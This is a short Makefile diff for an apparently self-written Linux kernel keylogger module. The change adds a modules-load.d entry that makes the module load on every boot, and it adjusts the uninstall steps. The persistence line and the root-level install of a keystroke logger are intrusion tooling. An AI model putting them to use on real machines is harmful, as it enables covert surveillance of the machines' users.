@@ -36,14 +36,16 @@ install:
 	gcc manager.c -o /etc/keylog/manager.o
 	mkdir -p /lib/modules/$(KVERSION)/misc/$(modname)
 	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)/misc/$(modname)
+	echo $(modname) > /etc/modules-load.d/$(modname).conf
 	insmod $(modname).ko
 	depmod -a
 
 
 uninstall:
-	sudo rm /lib/modules/$(KVERSION)/misc/$(modname)/$(modname).ko
-	sudo rmdir /lib/modules/$(KVERSION)/misc/$(modname)
-	sudo rm -rf /etc/keylog
-	sudo depmod -a
-	sudo rmmod $(modname)
-	sudo rm -rf /sys/kernel/debug/keylog
+	rm /lib/modules/$(KVERSION)/misc/$(modname)/$(modname).ko
+	rmdir /lib/modules/$(KVERSION)/misc/$(modname)
+	rm -rf /etc/keylog
+	depmod -a
+	rmmod $(modname)
+	rm -rf /sys/kernel/debug/keylog
+	rm /etc/modules-load.d/$(modname).conf
